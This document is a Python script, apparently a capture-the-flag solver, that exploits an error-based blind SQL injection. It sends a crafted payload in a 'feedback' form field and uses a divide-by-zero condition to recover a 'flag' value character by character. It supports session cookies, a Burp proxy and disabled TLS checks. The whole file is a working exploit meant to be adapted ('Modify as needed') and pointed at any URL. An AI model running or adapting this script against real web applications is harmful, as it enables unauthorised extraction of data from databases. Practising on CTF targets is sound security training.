# Author: Ahmed Alqahtani, SudoQ505
# use -h/--help for help menu
# pip install requests pwntools

import requests, time, argparse, urllib3
from pwn import log, context
context.log_level = "info"

SUCCESS_MARKER = "Thanks for the feedback" # Modify as needed
DEFAULT_CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}_" # Modify as needed

def make_session(session_cookie, use_burp, insecure):
    s = requests.Session()
    s.cookies.set("session", session_cookie)
    s.headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "pwntools-flag-extractor/1.1"
    })
    if use_burp:
        s.proxies.update({"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})
    # Insecure mode disables TLS verification (self-signed OK)
    s.verify = not insecure
    if insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    return s

def guess_char(session, url, pos, ch, retries=3, timeout=10):
    payload = (  # Modify as needed
        "'||(SELECT CASE "
        f"WHEN substr(flag,{pos},1)='{ch}' THEN '' "
        "ELSE (SELECT 1/0) END FROM flag)||'"
    )
    for attempt in range(retries):
        try:
            r = session.post(url, data={"feedback": payload}, timeout=timeout)
            return SUCCESS_MARKER in r.text
        except requests.RequestException:
            if attempt == retries - 1:
                raise
            time.sleep(0.25 * (attempt + 1))
    return False

def extract_flag(url, session_cookie, charset, max_len, delay, use_burp, insecure):
    s = make_session(session_cookie, use_burp, insecure)
    flag = ""
    banner = log.progress("Recovering flag")
    try:
        for pos in range(1, max_len + 1):
            spinner = log.progress(f"pos {pos}")
            found_here = False
            for ch in charset:
                spinner.status(f"trying '{ch}' | current: {flag}")
                if guess_char(s, url, pos, ch):
                    flag += ch
                    spinner.success(f"found '{ch}' → {flag}")
                    banner.status(flag)
                    if ch == "}":
                        banner.success(f"DONE: {flag}")
                        return flag
                    found_here = True
                    break
                time.sleep(delay)
            if not found_here:
                spinner.failure("no match (likely end)")
                banner.failure(f"Stopped at pos {pos}. Partial: {flag}")
                return flag
        banner.failure(f"Reached max_len. Partial: {flag}")
        return flag
    except KeyboardInterrupt:
        banner.failure(f"Interrupted. Partial: {flag}")
        return flag

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cookie", required=True, help="Value of the 'session' cookie")
    ap.add_argument("--charset", default=DEFAULT_CHARSET)
    ap.add_argument("--max-len", type=int, default=160)
    ap.add_argument("--delay", type=float, default=0.03)
    ap.add_argument("--burp", action="store_true", help="Proxy via 127.0.0.1:8080")
    ap.add_argument("--insecure", action="store_true", help="Disable TLS cert verification")
    args = ap.parse_args()

    extract_flag(args.url, args.cookie, args.charset, args.max_len, args.delay, args.burp, args.insecure)

if __name__ == "__main__":
    main()

